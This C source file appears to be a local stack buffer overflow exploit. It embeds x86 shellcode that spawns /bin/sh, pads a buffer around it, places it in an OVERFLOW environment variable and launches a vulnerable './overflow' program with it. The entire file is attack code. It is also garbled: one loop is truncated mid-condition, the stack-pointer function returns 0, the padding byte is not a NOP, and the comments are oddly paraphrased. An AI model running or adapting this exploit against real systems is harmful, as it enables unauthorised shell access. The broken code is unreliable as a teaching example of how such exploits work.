#include <stdlib.h>
#include <stdio.h> 

// Define the required variables

#define D_OFSET 2892
#define DFS 300
#define NOTAR 0x80



// Declare an array with the name of char.

char stack_c_smash[]= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

// Create a function with the name
// of find_stack_pnter to get the stack
unsigned long find_stack_pnter(void)
{
  // move or display the data
  __asm__("movl %esp,%eax");

  // return zero

  return 0;

}



// Create a main function with pass of
// argc and argc argument

int main(int argc, char **argv)
{
  // Declare the required variable
  char *ptr;
  // Create a buffer array to store the buffer size
  char buffer[DFS];
  
  // Declare the address
  
  long address;
  // Declare pointer is equal to buffer
  
  ptr = buffer;
  
  // Get the stack pointer address

  address = find_stack_pnter() - D_OFSET;

  // display the address

  printf("Using address: 0x%lx\n", address);



  // Copy the stack NOTAR using using pointer
  for (int i = 0; i
  // NOTAR is assigned in the NOTAR

  buffer[i] = NOTAR;



  // move the shell code using pointer
  
  ptr = buffer + ((DFS/2) - (strlen(stack_c_smash)/2));



  // loop start from o to access the

  // length of code

  for (int i = 0; i < strlen(stack_c_smash); i++)

  *(ptr++) = stack_c_smash[i];



  // buffer string exit with null

  buffer[DFS - 1] = '\0';



  // move the string into copy

  memcpy(buffer,"OVERFLOW=",9);



  // Put the enviornment variable into buffer

  putenv(buffer);



  //close the system

  system("/bin/bash");



  // sleep the system

  sleep(1);



  // overflow the system

  system("./overflow $OVERFLOW");



  // return the zero

  return 0;
}
